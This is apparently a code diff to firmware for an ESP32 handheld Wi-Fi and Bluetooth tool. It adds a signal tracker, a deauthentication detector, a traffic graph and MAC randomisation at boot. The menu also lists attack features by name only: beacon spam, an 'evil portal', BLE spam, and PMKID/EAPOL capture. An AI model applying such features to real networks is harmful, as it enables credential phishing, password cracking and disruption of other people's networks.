     case 4: wifi_beacon_spam_list(); break;
-    case 5: wifi_beacon_spam_random(); break;
+    case 5: wifi_beacon_spam_realistic(); break;
     case 6: wifi_rickroll(); break;
     case 7: wifi_probe_spam(); break;
-    case 8: bluetooth_ble_scan(); break;
-    case 9: bluetooth_bt_classic_scan(); break;
-    case 10: bluetooth_ble_spam(); break;
+    case 8: evil_portal_run(); break;
+    case 9: bluetooth_ble_scan(); break;
+    case 10: bluetooth_ble_spam_multi(); break;
     case 11: sniffing_start_raw_capture(); break;
     case 12: sniffing_capture_pmkid(); break;
     case 13: sniffing_capture_eapol(); break;
-    case 14: ESP.restart(); break;
+    case 14: tool_fox_hunt(); break;
+    case 15: tool_defense_ward(); break;
+    case 16: tool_matrix_graph(); break;
+    case 17: ESP.restart(); break;
   }
   
   delay(1500); // Pause to let user see "Run: ..."
   ui_draw_menu();
+}
+
+// 1. FOX HUNT (Signal Strength Tracker)
+void tool_fox_hunt() {
+  if (ap_count == 0) {
+      display.clearDisplay(); 
+      display.setCursor(0,0);
+      display.println(F("Scan APs first!"));
+      display.display();
+      delay(1500);
+      return;
+  }
+
+  // Simple Selection
+  int selected = 0;
+  bool selecting = true;
+  ui_wait_for_release();
+  
+  while(selecting) {
+      if (ui_check_button()) selecting = false;
+      
+      int yVal = analogRead(JOY_Y);
+      if (yVal < 1000) { selected--; delay(150); }
+      if (yVal > 3000) { selected++; delay(150); }
+      if (selected < 0) selected = ap_count - 1;
+      if (selected >= ap_count) selected = 0;
+      
+      display.clearDisplay();
+      display.setCursor(0,0);
+      display.println(F("Select Target:"));
+      display.println(F("----------------"));
+      display.print(F("> "));
+      display.println(ap_list[selected].ssid.substring(0, 14));
+      display.print(F("  "));
+      display.println(ap_list[(selected+1)%ap_count].ssid.substring(0, 14));
+      display.setCursor(0, 50);
+      display.println(F("Btn: TRACK THIS"));
+      display.display();
+  }
+  
+  ui_wait_for_release();
+  
+  int target_channels[] = { ap_list[selected].channel }; 
+  String target_ssid = ap_list[selected].ssid;
+  
+  bool running = true;
+  while(running) {
+      if (ui_check_button()) running = false;
+      
+      int n = WiFi.scanNetworks(false, true, false, 50, target_channels[0]);
+      int rssi = -100;
+      for(int i=0; i<n; i++) {
+          if (WiFi.SSID(i) == target_ssid) {
+              rssi = WiFi.RSSI(i);
+              break;
+          }
+      }
+      
+      display.clearDisplay();
+      display.setTextSize(1);
+      display.setCursor(0,0);
+      display.print(F("TRACKING: "));
+      display.println(target_ssid.substring(0,10));
+      
+      int barWidth = map(constrain(rssi, -100, -40), -100, -40, 2, SCREEN_WIDTH);
+      
+      display.fillRect(0, 20, barWidth, 20, SSD1306_WHITE);
+      display.drawRect(0, 20, SCREEN_WIDTH, 20, SSD1306_WHITE);
+      
+      display.setTextSize(2);
+      display.setCursor(0, 45);
+      display.print(rssi);
+      display.print(F(" dBm"));
+      
+      display.display();
+      delay(10);
+  }
+}
+
+// 2. DEFENSE WARD (Deauth Detector)
+void tool_defense_ward() {
+  ui_wait_for_release();
+  esp_wifi_set_promiscuous(true);
+  
+  bool running = true;
+  last_deauth_time = 0;
+  
+  display.clearDisplay();
+  display.setTextSize(1);
+  display.setCursor(0,0);
+  display.println(F("DEFENSE WARD ACTIVE"));
+  display.println(F("----------------"));
+  display.println(F("Monitoring for"));
+  display.println(F("attacks..."));
+  display.display();
+
+  while(running) {
+      if (ui_check_button()) running = false;
+      
+      if (millis() - last_deauth_time < 1000) {
+          display.invertDisplay(true);
+          display.clearDisplay();
+          display.setTextSize(2);
+          display.setCursor(10, 20);
+          display.println(F("ATTACK!"));
+          display.setTextSize(1);
+          display.setCursor(20, 45);
+          display.println(F("Deauth Detected"));
+          display.display();
+      } else {
+          display.invertDisplay(false);
+          display.clearDisplay();
+          display.setTextSize(1);
+          display.setCursor(0,0);
+          display.println(F("STATUS: SECURE"));
+          display.drawLine(0, 10, SCREEN_WIDTH, 10, SSD1306_WHITE);
+          
+          display.setCursor(0, 25);
+          display.println(F("No attacks detected"));
+          display.println(F("in range."));
+          display.display();
+      }
+      delay(50);
+  }
+  
+  esp_wifi_set_promiscuous(false);
+  display.invertDisplay(false);
+}
+
+// 3. MATRIX (Traffic Graph)
+void tool_matrix_graph() {
+  ui_wait_for_release();
+  esp_wifi_set_promiscuous(true);
+  
+  int history[128];
+  memset(history, 0, sizeof(history));
+  bool running = true;
+  
+  while(running) {
+      if (ui_check_button()) running = false;
+      
+      int current_traffic = packet_rate; 
+      packet_rate = 0; 
+      
+      for(int i=0; i<127; i++) history[i] = history[i+1];
+      history[127] = constrain(current_traffic, 0, 50); 
+      
+      display.clearDisplay();
+      
+      for(int i=0; i<127; i++) {
+          int y1 = 64 - history[i];
+          int y2 = 64 - history[i+1];
+          display.drawLine(i, y1, i+1, y2, SSD1306_WHITE);
+      }
+      
+      display.fillRect(0, 0, 128, 10, SSD1306_BLACK);
+      display.setCursor(0,0);
+      display.print(F("MATRIX: "));
+      display.print(current_traffic * 10); 
+      display.print(F(" pkts/s"));
+      
+      display.display();
+      delay(100);
+  }
+  esp_wifi_set_promiscuous(false);
 }
 
 // --- MAIN SETUP & LOOP ---
@@ -550,6 +1016,11 @@ void setup() {
   delay(2000);
 
   // WiFi Init
+  WiFi.mode(WIFI_OFF);
+  delay(10);
+  // Randomize MAC on Boot
+  randomize_mac();
+  
   WiFi.mode(WIFI_MODE_STA);
   WiFi.disconnect();
   esp_wifi_set_promiscuous_rx_cb(&sniffer_callback);
